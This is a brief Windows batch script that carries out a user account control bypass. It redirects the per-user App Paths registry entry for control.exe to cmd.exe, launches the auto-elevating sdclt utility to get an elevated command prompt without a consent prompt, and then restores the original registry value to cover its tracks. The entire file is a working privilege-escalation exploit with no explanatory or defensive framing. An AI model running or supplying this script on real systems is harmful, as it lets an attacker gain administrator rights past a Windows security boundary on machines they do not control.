@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
sdclt
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d "c:\windows\system32\control.exe" /f

